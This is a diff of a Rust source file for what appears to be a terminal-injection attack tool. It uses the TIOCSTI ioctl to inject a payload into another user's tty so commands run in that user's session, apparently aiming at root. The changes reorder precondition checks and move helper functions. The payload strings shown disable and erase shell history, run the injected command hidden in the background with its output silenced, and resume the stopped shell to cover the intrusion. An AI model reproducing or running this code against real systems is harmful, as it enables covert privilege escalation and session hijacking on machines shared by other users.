@@ -12,7 +12,7 @@ use std::time::Duration;
 use std::{env, fs, thread};
 
 use anyhow::Context as _;
-use libc::{SIGSTOP, STDIN_FILENO, TIOCSTI, c_int, getuid, ioctl, kill, pid_t, uid_t};
+use libc::{SIGSTOP, STDIN_FILENO, TIOCSTI, c_int, getppid, getuid, ioctl, kill, pid_t, uid_t};
 
 /// First part of the payload to inject into the tty's input buffer.
 const START: &[u8] = b" exec 2>&-;set +o history\nhistory -d-1\n({ ";
@@ -27,15 +27,15 @@ const END: &[u8] = b";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n";
 ///
 /// Returns an [`anyhow::Error`] if the `TIOCSTI` ioctl fails.
 pub fn run() -> anyhow::Result<()> {
-    // Check that we are not already root, that stdin refers to a terminal, and that we have a valid parent.
-    // SAFETY: getuid() is safe to call
-    let uid = unsafe { getuid() };
+    // Check that stdin refers to a terminal, that we are not already root, and that we have a valid parent.
     let is_tty = io::stdin().is_terminal();
-    // SAFETY: getppid() is safe to call
-    let parent_pid = unsafe { libc::getppid() };
+    // SAFETY: getuid() is safe to call in this context
+    let uid = unsafe { getuid() };
+    // SAFETY: getppid() is safe to call in this context
+    let parent_pid = unsafe { getppid() };
     check_preconditions(uid, is_tty, parent_pid)?;
 
-    // Check that we have a valid tty and that it does not have the same uid as us.
+    // Check stdin refers to a valid tty and that such tty does not have the same uid as us.
     let tty_path = fs::read_link(format!("/proc/self/fd/{STDIN_FILENO}"))
         .context("failed to resolve tty path")?;
     let tty_metadata = fs::metadata(&tty_path).context("failed to stat tty")?;
@@ -77,29 +77,7 @@ pub fn run() -> anyhow::Result<()> {
     // TODO: publish on crates.io and enable semver checks in ci
     // TODO: final check of cargo doc --open
 
-    // No need to SIGCONT here because `fg` in the payload does that for us.
-    Ok(())
-}
-
-/// Checks that we are not already root, that stdin refers to a terminal, and that we have a valid parent.
-fn check_preconditions(uid: uid_t, is_tty: bool, parent_pid: pid_t) -> anyhow::Result<()> {
-    if uid == 0 {
-        anyhow::bail!("we are already root");
-    }
-    if !is_tty {
-        anyhow::bail!("stdin does not refer to a terminal");
-    }
-    if parent_pid <= 1 {
-        anyhow::bail!("invalid parent process id");
-    }
-    Ok(())
-}
-
-/// Checks that the tty does not have the same uid as us.
-fn check_tty_ownership(uid: uid_t, tty_uid: uid_t) -> anyhow::Result<()> {
-    if tty_uid == uid {
-        anyhow::bail!("tty has the same uid as us");
-    }
+    // No need to SIGCONT here because `fg` at the end of the payload does that for us.
     Ok(())
 }
 
@@ -171,6 +149,28 @@ pub fn clear_terminal(lines: u16) {
         print!("\x1b[{lines}A\x1b[J");
     }
     _ = io::stdout().flush();
+}
+
+/// Checks that stdin refers to a terminal, that we are not already root, and that we have a valid parent.
+fn check_preconditions(uid: uid_t, is_tty: bool, parent_pid: pid_t) -> anyhow::Result<()> {
+    if !is_tty {
+        anyhow::bail!("stdin does not refer to a terminal");
+    }
+    if uid == 0 {
+        anyhow::bail!("we are already root");
+    }
+    if parent_pid <= 1 {
+        anyhow::bail!("invalid parent process id");
+    }
+    Ok(())
+}
+
+/// Checks that the tty does not have the same uid as us.
+fn check_tty_ownership(uid: uid_t, tty_uid: uid_t) -> anyhow::Result<()> {
+    if tty_uid == uid {
+        anyhow::bail!("tty has the same uid as us");
+    }
+    Ok(())
 }
 
 #[expect(clippy::expect_used, reason = "tests can use `expect`")]
